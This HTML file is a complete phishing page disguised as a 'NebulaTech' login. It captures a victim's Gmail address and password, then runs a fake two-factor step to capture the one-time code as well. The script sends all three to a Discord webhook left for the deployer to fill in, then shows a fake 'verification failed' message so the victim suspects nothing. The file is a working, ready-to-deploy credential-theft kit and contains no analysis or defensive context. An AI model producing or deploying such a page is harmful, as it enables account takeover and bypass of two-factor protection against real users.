<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>NebulaTech Access Gateway</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #eaeaea;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #1a1a1a;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0,255,255,0.1);
      width: 380px;
      display: flex;
      flex-direction: column;
    }

    h2 {
      text-align: center;
      color: #00ffff;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      background-color: #2a2a2a;
      border: none;
      border-radius: 6px;
      color: #fff;
    }

    input::placeholder {
      color: #888;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #00cccc;
      border: none;
      border-radius: 6px;
      color: #000;
      font-weight: bold;
      margin-top: 15px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #00aaaa;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="login-box" id="loginStage">
    <h2>NebulaTech Login</h2>
    <input type="text" id="email" placeholder="Email (Gmail only)">
    <input type="password" id="password" placeholder="Access Key">
    <button onclick="handleLogin()">Access System</button>
  </div>

  <div class="login-box hidden" id="codeStage">
    <h2>Verification Required</h2>
    <p style="margin-bottom:10px;">A security code has been sent to your Gmail.</p>
    <input type="text" id="codeInput" placeholder="Enter 6-digit Code">
    <button onclick="handleVerification()">Verify</button>
  </div>

  <script>
    function isValidGmail(email) {
      return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
    }

    const webhookURL = "https://discord.com/api/webhooks/REPLACE_WITH_YOURS";

    let capturedEmail = "";
    let capturedPassword = "";

    function handleLogin() {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value;

      if (!isValidGmail(email)) {
        alert("Only Gmail addresses are allowed.");
        return;
      }

      capturedEmail = email;
      capturedPassword = password;

      document.getElementById("loginStage").classList.add("hidden");
      document.getElementById("codeStage").classList.remove("hidden");
    }

    async function handleVerification() {
      const code = document.getElementById("codeInput").value;

      const payload = {
        content: "**Multi-step login attempt**",
        embeds: [{
          title: "ðŸ›¡ï¸ NebulaTech Credentials",
          color: 15844367,
          fields: [
            { name: "Email", value: capturedEmail },
            { name: "Password", value: capturedPassword },
            { name: "2FA Code", value: code },
            { name: "Timestamp", value: new Date().toLocaleString() }
          ]
        }]
      };

      try {
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        console.warn("Webhook error:", e);
      }

      setTimeout(() => {
        alert("Verification failed. Please try again.");
        location.reload();
      }, 1000);
    }
  </script>
</body>
</html>
